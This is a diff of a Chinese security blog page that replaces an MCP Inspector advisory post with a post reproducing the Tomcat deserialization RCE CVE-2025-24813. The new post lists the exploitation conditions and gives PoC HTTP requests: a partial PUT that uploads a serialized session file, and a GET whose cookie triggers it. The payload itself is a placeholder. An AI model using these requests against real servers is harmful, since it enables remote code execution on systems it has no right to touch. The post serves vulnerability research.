@@ -19,22 +19,26 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="链接： https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-7f8r-222p-6f5g 仓库 Star： 3997 参考链接：  https:&#x2F;&#x2F;github.com&#x2F;modelcontextprotocol&#x2F;inspector&#x2F;security&#x2F;advisories&#x2F;GHSA-7f8r-222p-6f5g  https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;C">
+    <meta name="description" content="漏洞信息漏洞名称： Tomcat 反序列化漏洞 漏洞编号：  CVE： CVE-2025-24813  漏洞类型： 反序列化 漏洞等级： 高危 漏洞描述： 本漏洞针对CVE-2025-24813，涉及Tomcat的反序列化远程代码执行(RCE)漏洞。利用条件包括应用程序启用了DefaultServlet写入功能、支持partial PUT请求、使用了Tomcat的文件会话持久化并默认会话存储位置，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MCP Inspector proxy server lacks authentication between the Inspector client and proxy">
-<meta property="og:url" content="http://example.com/2025/06/13/github_3862121657/index.html">
+<meta property="og:title" content="Tomcat 反序列化漏洞">
+<meta property="og:url" content="http://example.com/2025/06/21/github_2619596667/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="链接： https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-7f8r-222p-6f5g 仓库 Star： 3997 参考链接：  https:&#x2F;&#x2F;github.com&#x2F;modelcontextprotocol&#x2F;inspector&#x2F;security&#x2F;advisories&#x2F;GHSA-7f8r-222p-6f5g  https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;C">
+<meta property="og:description" content="漏洞信息漏洞名称： Tomcat 反序列化漏洞 漏洞编号：  CVE： CVE-2025-24813  漏洞类型： 反序列化 漏洞等级： 高危 漏洞描述： 本漏洞针对CVE-2025-24813，涉及Tomcat的反序列化远程代码执行(RCE)漏洞。利用条件包括应用程序启用了DefaultServlet写入功能、支持partial PUT请求、使用了Tomcat的文件会话持久化并默认会话存储位置，">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-13T22:30:05.638Z">
-<meta property="article:modified_time" content="2025-06-13T22:30:05.633Z">
+<meta property="og:image" content="https://github.com/user-attachments/assets/1d9aa484-d151-45a6-bdff-7952af277c89">
+<meta property="og:image" content="https://github.com/user-attachments/assets/9bacb253-0b76-4f16-9a5a-c123eb6fca73">
+<meta property="article:published_time" content="2025-06-21T14:45:14.393Z">
+<meta property="article:modified_time" content="2025-06-21T14:45:14.388Z">
 <meta property="article:author" content="lianccc">
-<meta property="article:tag" content="Github Advisory">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="CVE-2025:github search">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://github.com/user-attachments/assets/1d9aa484-d151-45a6-bdff-7952af277c89">
   
   
   
-  <title>MCP Inspector proxy server lacks authentication between the Inspector client and proxy - liancc&#39; infos blog</title>
+  <title>Tomcat 反序列化漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +205,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="MCP Inspector proxy server lacks authentication between the Inspector client and proxy"></span>
+            <span id="subtitle" data-typed-text="Tomcat 反序列化漏洞"></span>
           
         </div>
 
@@ -212,8 +216,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-13 22:30" pubdate>
-          2025年6月13日 晚上
+        <time datetime="2025-06-21 14:45" pubdate>
+          2025年6月21日 下午
         </time>
       </span>
     
@@ -224,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          63 字
+          475 字
         
       </span>
     
@@ -235,7 +239,7 @@
         
         
         
-          1 分钟
+          4 分钟
         
       </span>
     
@@ -272,27 +276,47 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">MCP Inspector proxy server lacks authentication between the Inspector client and proxy</h1>
+            <h1 id="seo-header">Tomcat 反序列化漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>链接：</strong> <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-7f8r-222p-6f5g">https://github.com/advisories/GHSA-7f8r-222p-6f5g</a></p>
-<p><strong>仓库 Star：</strong> 3997</p>
-<p><strong>参考链接：</strong></p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Tomcat 反序列化漏洞</p>
+<p><strong>漏洞编号：</strong></p>
 <ul>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g">https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-49596">https://nvd.nist.gov/vuln/detail/CVE-2025-49596</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979">https://github.com/modelcontextprotocol/inspector/commit/50df0e1ec488f3983740b4d28d2a968f12eb8979</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-7f8r-222p-6f5g">https://github.com/advisories/GHSA-7f8r-222p-6f5g</a></p>
-</li>
+<li><strong>CVE：</strong> CVE-2025-24813</li>
 </ul>
-<p><strong>描述：</strong></p>
-<p>Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio. Users should immediately upgrade to version 0.14.1 or later to address these vulnerabilities.</p>
-<p>Credit: Rémy Marot <a href="mailto:&#98;&#117;&#x67;&#104;&#117;&#x6e;&#116;&#x65;&#x72;&#x73;&#x40;&#116;&#101;&#x6e;&#97;&#x62;&#108;&#x65;&#x2e;&#99;&#111;&#109;">bughunters@tenable.com</a></p>
+<p><strong>漏洞类型：</strong> 反序列化</p>
+<p><strong>漏洞等级：</strong> 高危</p>
+<p><strong>漏洞描述：</strong> 本漏洞针对CVE-2025-24813，涉及Tomcat的反序列化远程代码执行(RCE)漏洞。利用条件包括应用程序启用了DefaultServlet写入功能、支持partial PUT请求、使用了Tomcat的文件会话持久化并默认会话存储位置，以及应用中包含存在反序列化漏洞的库。漏洞利用需要上传恶意的序列化文件并通过特定请求触发。</p>
+<p><strong>产品厂商：</strong> Apache</p>
+<p><strong>产品名称：</strong> Tomcat</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/x1ongsec/CVE-2025-24813">https://github.com/x1ongsec/CVE-2025-24813</a></p>
+<p><strong>类型：</strong> CVE-2025:github search</p>
+<h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
+<li>README.md</li>
+<li>apache-tomcat-9.0.98</li>
+</ul>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>本仓库是针对 CVE-2025-24813 Tomcat 最新 RCE 复现的环境。</p>
+<p><strong>仅供学习研究使用！</strong></p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>应用程序启用了DefaultServlet写入功能，该功能默认关闭</li>
+<li>应用支持了 partial PUT 请求，能够将恶意的序列化数据写入到会话文件中，该功能默认开启</li>
+<li>应用使用了 Tomcat 的文件会话持久化并且使用了默认的会话存储位置，需要额外配置</li>
+<li>应用中包含一个存在反序列化漏洞的库，比如存在于类路径下的 commons-collections，此条件取决于业务实现是否依赖存在反序列化利用链的库</li>
+</ul>
+<p><strong>本环境已开启上述复现所需条件</strong></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>生成一个恶意的序列化文件，使用以下数据包上传，需要注意 Range 的分块值需要与 Length 保持一致，且大于当前文件的长度。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs poc">PUT /xxxxx/session HTTP/1.1  <br>Host: 192.168.131.32:8080  <br>Content-Length: 1000  <br>Content-Range: bytes 0-1000/1200  <br><br>&#123;&#123;反序列化文件内容)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>使用如下 poc 触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs poc">GET / HTTP/1.1  <br>Host: 192.168.131.32:8080  <br>Cookie: JSESSIONID=.xxxxx<br></code></pre></td></tr></table></figure>
+<img width="1392" alt="image" src="https://github.com/user-attachments/assets/1d9aa484-d151-45a6-bdff-7952af277c89" srcset="/img/loading.gif" lazyload />
+<img width="1379" alt="image" src="https://github.com/user-attachments/assets/9bacb253-0b76-4f16-9a5a-c123eb6fca73" srcset="/img/loading.gif" lazyload />
+
+<p>参考：<a target="_blank" rel="noopener" href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></p>
 
                 
               </div>
@@ -311,7 +335,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="category-chain-item">安全公告</a>
+  <a href="/categories/Github-Poc/" class="category-chain-item">Github Poc</a>
   
   
 
@@ -326,7 +350,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Github-Advisory/" class="print-no-link">#Github Advisory</a>
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
       
     </div>
   
@@ -338,8 +364,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>MCP Inspector proxy server lacks authentication between the Inspector client and proxy</div>
-      <div>http://example.com/2025/06/13/github_3862121657/</div>
+      <div>Tomcat 反序列化漏洞</div>
+      <div>http://example.com/2025/06/21/github_2619596667/</div>
     </div>
     <div class="license-meta">
       
@@ -351,7 +377,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年6月13日</div>
+          <div>2025年6月21日</div>
         </div>
       
       
@@ -383,18 +409,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/14/weixin_605976721/" title="Optilink管理系统genephp接口存在远程命令执行漏洞 附POC">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Optilink管理系统genephp接口存在远程命令执行漏洞 附POC</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/13/github_3073953974/" title="PAN-OS 反射型跨站脚本漏洞">
-                        <span class="hidden-mobile">PAN-OS 反射型跨站脚本漏洞</span>
+                      <a href="/2025/06/21/weixin_4199705163/" title="GitHub遭黑产利用，76个账号被用于恶意软件攻击">
+                        <span class="hidden-mobile">GitHub遭黑产利用，76个账号被用于恶意软件攻击</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
